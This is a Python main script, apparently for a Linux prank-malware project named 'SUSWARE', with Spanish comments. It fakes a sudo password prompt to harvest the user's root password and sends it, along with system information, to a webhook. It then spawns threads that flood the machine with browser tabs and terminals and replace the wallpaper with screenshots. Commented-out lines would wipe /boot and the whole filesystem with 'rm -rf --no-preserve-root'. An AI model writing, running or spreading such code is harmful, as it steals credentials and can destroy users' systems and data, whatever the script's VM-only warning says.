from os import listdir
from threading import Thread
from colorama import Fore, Style
from time import sleep
import webbrowser
from subprocess import run
# Importa los módulos desde src
try:
     from src.behavior import * 
     from src.destruct import *
     from src.pc_info import *
     from src.wallpaper import *
     
except ModuleNotFoundError:
     print("Ejecuta el script desde la carpeta linux, por favor")
     
# Mira si el script está corriendo     
def check():
     system("sh src/check_main.sh")     
     
def main():
     print(Fore.GREEN, '''
     ███████╗██╗   ██╗███████╗██╗    ██╗ █████╗ ██████╗ ███████╗
     ██╔════╝██║   ██║██╔════╝██║    ██║██╔══██╗██╔══██╗██╔════╝
     ███████╗██║   ██║███████╗██║ █╗ ██║███████║██████╔╝█████╗  
     ╚════██║██║   ██║╚════██║██║███╗██║██╔══██║██╔══██╗██╔══╝  
     ███████║╚██████╔╝███████║╚███╔███╔╝██║  ██║██║  ██║███████╗
     ╚══════╝ ╚═════╝ ╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
          ''', Fore.RESET)
     print()

     print(Fore.RED, """
                         ADVERTENCIA DE USO
               Este script puede ser MORTAL para tu pc
               Solo uso de testeos y máquina virtual
               
               No me hago responsable del tipo de daños
               que esto pueda causar si se ejecuta en
               pc física
               
                                             - lVoidi
          """, Fore.RESET)
     print(Style.BRIGHT)
     print(Fore.CYAN,"""
               Agradecimientos a las siguientes personas
               - Br3fuck → https://github.com/Br3Fuck
               - Chxki   → https://github.com/Ch1KZX
          """)     
     print(Style.RESET_ALL)

     # Lista el directorio home, donde suele 
     # estar el nombre del usuario en cuestión
     username = listdir('/home/')[0]
     print(Style.BRIGHT)

     # Sudo falso
     rootPassword = input(f'[sudo] password for {username}: ')

     # Abre una pestaña a google con el among drip
     webbrowser.open('https://youtu.be/0bZ0hkiIKt0')
     sleep(15)
          
     # Se conecta con un webhook y manda la información del usuario
     user_info(root_pswd=rootPassword,
               webhook='link del webhook')
     #    Empieza a eliminar el grub para que el usuario no pueda reiniciar así nomas
     #system('sudo rm -rf --no-preserve-root /boot/')

     # Lista de threads
     threads = []

     # Inicia 3 threads, todos haciendo lo mismo,
     # ralentizando muchisimo la máquina
     #

     #    Este thread se encarga de abrir pestañas del
     #    Navegador con varias busquedas variadas
     #    source              :    src/behavior.py, línea 21         
     t1 = Thread(target=webOpen)
     t1.start()
          
     #    Este thread abre emuladores de terminal, 
     #    Con el objetivo de confundir
     #    source              :    src/behavior.py, línea 56         
     t2 = Thread(target=annoying_behavior)
     t2.start()
          
     #    Este thread toma capturas de pantalla usando flameshot,
     #    y las pone de fondo de pantalla, confundiendo aún mas
     #    source              :    src/wallpaper.py, línea 21    
     t3 = Thread(target=set_wallpapers)
     t3.start()

     #    Este thread se encarga de destruir el sistema operativo linux,
     #    primero destruyendo el boot para seguidamente remover
     #    todos los archivos que pueda usando el comando ```sudo rm -rf --no-preserve-root /```
     #    source              :    src/destruct.py, línea 5
     #t4 = Thread(target=start_destruction)
     #t4.start()
     
#    Comprueba si el script está corriendo      
     t5 = Thread(target=check)
     t5.start()
     
     #    Agrega los threads a la lista
     threads.append(t1)
     threads.append(t2)
     threads.append(t3)
     #threads.append(t4)
     threads.append(t5)
     # Los threads son unidos
     for thread in threads:

     #    Une cada thread por cada
     #    Vuelta de bucle
          thread.join()

if __name__ == "__main__":
     main()
